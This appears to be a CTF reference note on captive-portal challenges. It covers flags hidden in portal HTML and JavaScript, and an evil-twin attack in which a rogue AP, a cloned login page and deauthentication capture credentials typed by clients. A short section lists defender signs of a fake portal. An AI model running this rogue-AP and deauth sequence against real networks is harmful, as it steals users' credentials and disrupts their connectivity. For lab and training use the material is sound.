# Captive-portal cred flags

## The puzzle shape

The AP is open (or PSK-known). Associating drops you into a captive
portal login page. The flag is what a *user* is going to type in
that login page — or, in a variant, the flag is embedded in the
form's HTML / JS / API response.

## Case A — the flag is in the portal itself

Just associate and browse. Read the HTML source, watch network
requests. Common flag hiding places:

- Hidden form fields (`<input type="hidden" name="flag" value="…">`)
- JavaScript variable definitions in the page source
- API responses to XHR requests the portal makes on load
- Referer / cookie / X-Header values the portal echoes back

## Case B — the flag is what a victim types

You stand up your own captive portal on a rogue AP alongside the
target. Victim clients associate to you, hit your portal, type
credentials — those credentials are the flag.

```
# 1. Clone the target SSID.
do_create_rogue_ap(ssid="WCTF-Public", channel=6, security="open",
                   i_own_the_airspace=True)
# 2. Bring up a captive portal that templates the target vendor's
#    login page.
serve_captive_portal(handle=<rogue-handle>, template="basic")
# 3. Deauth clients off the real AP so they reassociate to you.
do_deauth(bssid=<target-bssid>, count=10,
          i_own_the_airspace=True)
# 4. Watch the credential log.
tail -f /tmp/portal-creds.log
```

## Signs a portal IS a trap (defender view)

- Certificate name mismatch — the portal domain doesn't match the
  cert CN.
- HSTS absent — real portals for known-good vendors ship HSTS.
- DNS strangeness — every hostname resolves to the same IP.
- The portal insists on "sign in" for a network the client has
  been on before (real captive portals honor a re-auth cookie).

## Cite

- attacks.json: `captive-portal-cred-capture`, `evil-twin-clone`.
- knowledge/captive-portal/reference.md.
